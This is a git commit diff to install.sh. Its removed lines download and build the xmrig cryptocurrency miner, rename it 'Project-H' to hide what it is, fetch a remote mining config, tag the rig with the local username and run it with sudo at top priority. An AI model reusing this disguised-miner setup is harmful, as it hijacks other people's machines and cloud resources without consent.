2877966a69e6e35a01488356c605c565f1b1e236
U117A <33190250+U117A@users.noreply.github.com>
2020-09-12 00:06:35 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,26 +1,3 @@
 #!/bin/bash
-export TZ=America/Sao_Paulo
-export LOCAL=$(cat $(find /home -name home.file))
-data=$(date +"%d-%m-%Y_%H:%M:%S")
-cd $LOCAL
-if [ ! -e "AAA/build/Project-H" ]; then
-   sudo rm -rf AAA
-   sudo apt-get update
-   sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
-   wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
-   unzip AAA.zip
-   rm -rf AAA.zip
-   cd AAA
-   mkdir build
-   cd build
-   cmake ..
-   make
-   mv xmrig Project-H
-   wget https://raw.githubusercontent.com/U117A/scripts/master/config.json
-else
-   cd AAA/build
-   sudo rm -rf config.json && sudo wget https://raw.githubusercontent.com/U117A/scripts/master/config.json
-fi
-user=${LOCAL/'/home/'}
-sudo sed -i 's/"rig-id":.*/"rig-id": "'$user'",/' config.json
-sudo nice -n -20 ./Project-H
+sudo apt-get update
+sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
